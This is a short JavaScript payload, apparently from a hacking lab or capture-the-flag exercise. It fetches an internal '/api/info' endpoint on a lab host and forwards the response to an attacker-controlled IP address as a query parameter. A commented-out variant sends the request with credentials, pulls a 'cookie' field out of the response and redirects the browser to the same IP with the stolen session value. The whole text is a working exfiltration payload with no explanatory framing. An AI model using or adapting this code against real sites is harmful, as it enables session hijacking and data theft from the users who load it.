fetch('https://guitjapeo.thl/api/info')
        .then(resp => resp.text())
        .then(text => {
                fetch('http://10.0.2.17/?exfil='+text);
        });
// var req = new XMLHttpRequest();
// req.onload=reqListener;
// var url="https://guitjapeo.thl/api/info";
// req.withCredentials=true;
// req.open("GET",url,false);
// req.send();
// function reqListener() {
//     const sess=JSON.parse(this.responseText).cookie;
//     location.href="http://10.0.2.17/?data="+sess;
// };
